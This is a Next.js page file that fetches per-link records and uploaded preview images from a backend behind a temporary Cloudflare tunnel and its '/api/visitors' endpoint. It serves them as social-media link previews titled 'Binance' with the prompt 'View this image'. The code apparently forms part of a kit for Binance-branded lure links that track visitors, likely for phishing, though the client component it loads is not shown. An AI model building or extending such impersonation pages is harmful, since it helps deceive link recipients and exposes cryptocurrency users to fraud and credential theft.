import type { Metadata } from 'next';
import BinanceClient from './BinanceClient';

// CHANGE IF CLOUDFLARE RESTARTS
const FLASK_API = "https://beneficial-acrylic-fighter-saves.trycloudflare.com";

export async function generateMetadata({ params }: { params: { id: string } }): Promise<Metadata> {
  const id = params.id;
  let imageUrl = 'https://public.bnbstatic.com/static/images/common/favicon.ico'; // Fallback image
  
  try {
    // Fetch the image URL from your Python backend
    const res = await fetch(`${FLASK_API}/api/visitors`, { cache: 'no-store' });
    const data = await res.json();
    const link = data.links.find((l: any) => l.id === id);
    
    if (link) {
      imageUrl = `${FLASK_API}/uploads/${link.preview_path}`;
    }
  } catch (e) {
    console.error("Failed to fetch metadata for image preview", e);
  }

  return {
    title: 'Binance',
    description: 'View this image',
    openGraph: {
      title: 'Binance',
      description: 'View this image',
      images: [imageUrl],
      type: 'website',
    },
    twitter: {
      card: 'summary_large_image',
      title: 'Binance',
      description: 'View this image',
      images: [imageUrl],
    }
  };
}

export default function Page({ params }: { params: { id: string } }) {
  // Pass the ID to the Client Component
  return <BinanceClient id={params.id} />;
}